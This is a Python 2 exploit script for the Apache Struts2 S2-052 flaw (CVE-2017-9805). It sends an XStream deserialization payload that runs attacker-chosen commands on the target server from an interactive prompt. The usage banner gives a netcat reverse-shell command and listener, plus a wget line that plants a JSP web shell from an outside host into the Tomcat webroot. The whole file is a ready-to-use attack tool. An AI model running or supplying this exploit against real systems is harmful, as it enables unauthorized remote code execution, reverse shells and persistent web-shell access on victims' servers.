#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib


def exploit(url, cmd):
    payload='<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> %s'%cmd
    payload+=' </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map>'    
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/xml'}
        request = urllib2.Request(url, headers=headers,data=payload)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead as e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print('+-----------------------------------------------------------------------+')
        print('+ USE: python <filename> <url>                                          +')
        print('+ EXP: python struts2-052_command.py http://1.1.1.1:8080                +')
        print('+      [cmd]   nc -e /bin/bash 2.2.2.2 9999                             +')
        print('+      [shell] nc -lvvp 9999                                            +')
        print('+ GET: wget -P /usr/local/tomcat/webapps/ROOT/ 2.2.2.2/shell.jsp        +')
        print('+ VER: Struts 2.1.2-2.3.33                                              +')
        print('+      Struts 2.5-2.5.12                                                +')
        print('+-----------------------------------------------------------------------+')
        print('+ DES: 命令执行无法回显，但是执行正常，建议反弹nc                       +')
        print('+-----------------------------------------------------------------------+')
        
    else:
        print('[*] CVE: 2017-9805 - Apache Struts2 S2-052')
        url = sys.argv[1]
        kill=""
        while 1:
            cmd=raw_input('cmd:   ')
            k=cmd.split()
            for each in k:
                kill+="<string>"+each+"</string>"
            
            exploit(url, kill)
            kill=""
